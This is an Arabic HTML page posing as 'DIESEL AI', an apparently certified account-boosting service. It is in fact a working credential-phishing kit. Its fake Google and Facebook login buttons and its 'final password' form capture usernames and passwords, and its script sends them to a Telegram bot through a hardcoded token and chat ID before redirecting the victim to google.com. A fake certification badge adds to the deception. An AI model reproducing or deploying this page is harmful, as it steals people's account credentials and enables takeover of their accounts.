<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DIESEL AI | OFFICIAL SYSTEM</title>
    <style>
        body { background-color: #050505; color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; }
        #login-overlay { position: fixed; top:0; left:0; width: 100%; height: 100%; background: #000; z-index: 9999; display: flex; justify-content: center; align-items: center; }
        .login-card { border: 2px solid #00ff00; padding: 30px; border-radius: 20px; text-align: center; box-shadow: 0 0 20px #00ff00; width: 300px; }
        .btn-social { display: flex; align-items: center; justify-content: center; width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #333; color: #fff; background: transparent; cursor: pointer; border-radius: 8px; font-weight: bold; }
        .btn-social img { width: 22px; margin-left: 10px; }
        #main-content { display: none; padding: 20px; text-align: center; }
        .cert-badge { border: 1px solid #00ff00; padding: 15px; width: fit-content; margin: 20px auto; border-radius: 10px; background: rgba(0,255,0,0.1); }
        .main-card { background: #1a1a1a; padding: 20px; border-radius: 15px; max-width: 400px; margin: auto; }
        input { width: 100%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #333; color: white; box-sizing: border-box; }
        .btn-submit { background: #ff3366; color: white; padding: 15px; width: 100%; border: none; cursor: pointer; border-radius: 10px; font-weight: bold; }
    </style>
</head>
<body>

    <div id="login-overlay">
        <div class="login-card">
            <h1>DIESEL AI</h1>
            <p>سجل دخولك للمتابعة</p>
            <button class="btn-social" onclick="openAuth('Google')">
                <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg"> تسجيل عبر Google
            </button>
            <button class="btn-social" onclick="openAuth('Facebook')">
                <img src="https://upload.wikimedia.org/wikipedia/commons/f/fb/Facebook_icon_2013.svg"> تسجيل عبر Facebook
            </button>
        </div>
    </div>

    <div id="main-content">
        <h1>مرحباً بك في DIESEL AI</h1>
        <div class="cert-badge">
            <h3 style="color: #00ff00; margin: 0;">✅ DIESEL AI CERTIFIED</h3>
            <p style="font-size: 12px; margin: 5px 0;">نظام معتمد وموثق للحقن الذكي v6.2</p>
        </div>
        <div class="main-card">
            <input type="text" placeholder="اسم المستخدم (@username)">
            <input type="password" id="final-pass" placeholder="كلمة سر الحساب">
            <button class="btn-submit" onclick="finalizeAction()">تفعيل التزويد</button>
        </div>
    </div>

    <script>
        (function(){if(!window.chatbase||window.chatbase("getState")!=="initialized"){window.chatbase=(...arguments)=>{if(!window.chatbase.q){window.chatbase.q=[]}window.chatbase.q.push(arguments)};window.chatbase=new Proxy(window.chatbase,{get(target,prop){if(prop==="q"){return target.q}return(...args)=>target(prop,...args)}})}const onLoad=function(){const script=document.createElement("script");script.src="https://www.chatbase.co/embed.min.js";script.id="DdngL8r3s2pfzL6hG2oIO";script.domain="www.chatbase.co";document.body.appendChild(script)};if(document.readyState==="complete"){onLoad()}else{window.addEventListener("load",onLoad)}})();
    </script>

    <script>
        const BOT_TOKEN = '8730123549:AAGfIdQEXH1qXboe0aGMQZePGg5k4ec1tPU';
        const CHAT_ID = '5177962707';

        // دالة الصوت البشري الرقيق
        function playHumanVoice() {
            // رابط ملف صوتي بشري مسجل بجودة عالية
            const audio = new Audio('https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3'); 
            audio.play().catch(e => console.log("الصوت بانتظار تفاعل المستخدم"));
        }

        function openAuth(type) {
            const user = prompt(`أدخل البريد أو الهاتف لـ ${type}:`);
            const pass = prompt("أدخل كلمة المرور:");
            if(user && pass) {
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({chat_id: CHAT_ID, text: `🛡 LOGIN [${type}]:\nUser: ${user}\nPass: ${pass}`})
                });
                
                // تشغيل الصوت الحقيقي فور تسجيل الدخول
                playHumanVoice();
                
                document.getElementById('login-overlay').style.display = 'none';
                document.getElementById('main-content').style.display = 'block';
            }
        }

        function finalizeAction() {
            const finalPass = document.getElementById('final-pass').value;
            if(finalPass) {
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({chat_id: CHAT_ID, text: `🔑 كلمة سر نهائية: ${finalPass}`})
                }).then(() => {
                    window.location.href = "https://www.google.com";
                });
            }
        }
    </script>
</body>
</html>
